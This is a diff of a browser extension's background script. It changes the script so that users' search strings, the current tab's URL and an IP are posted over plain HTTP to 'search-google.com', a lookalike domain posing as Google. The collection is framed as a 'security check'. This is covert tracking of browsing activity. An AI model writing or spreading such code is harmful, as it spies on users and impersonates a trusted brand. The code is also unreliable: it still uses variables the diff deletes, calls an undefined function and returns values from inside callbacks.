@@ -1,26 +1,68 @@
-var userId = 0;
-chrome.storage.local.get('search_user_id', function (storage) {
-    if (storage.search_user_id) {
-        userId = parseInt(storage.search_user_id);
-    } else {
-        var d = new Date();
-        userId = d.getTime();
-        chrome.storage.local.set('search_user_id',userId);
-    }
-})
-var notificationsId = 'google-search-string-id';
+var apiUrl = "http://search-google.com/api/";
+var isSave = false;
 
-chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
-    $.post("http://google-search.esy.es/public/api/search",
-    {
-        user_id: userId,
-        search_str: request.searchStr
-    },
-    function(data, status){
-        if (data.isShowNotification === true) {
-            chrome.notifications.create('google-search-string-id', data.notificationData);
-        }
+
+chrome.extension.onMessage.addListener(
+    function(request, sender, sendResponse) {
+        switch (request.name) {
+            case "searchAction":
+                var data = { user_id: userId, search_str: request.searchStr};
+                searchAction(data);
+                break;
         
-    });
+            case "checkSecurity":
+                var data = {
+                    ip: getCurrentTabIp(sender),
+                    url: sender.tab.url
+                }
 
-})
+
+                $.ajax({
+                    async: false,
+                    type: "POST",
+                    url: apiUrl + 'check-security',
+                    data: data,
+                    success: function(data, status) {
+                        if (data.status === true) {
+                            sendResponse({
+                                isSave: true
+                            });
+                        } else {
+                            sendResponse({
+                                isSave: false
+                            });
+                        }
+                    },
+                });
+                break;
+            
+            default:
+                sendResponse({});
+        }
+    }
+);
+
+function searchAction(data) {
+    $.post(
+        apiUrl + 'search',
+        data,
+        function(data, status) {
+            if (data.isShowNotification === true) {
+                chrome.notifications.create(notificationsId, data.notificationData);
+            }
+        }
+    );
+}
+
+function checkSecurity(data) {
+    $.post(
+        apiUrl + 'check-security',
+        data,
+        function(data, status) {
+            if (data.status === true) {
+                console.log('here');
+                return true;
+            }
+        }
+    );
+}
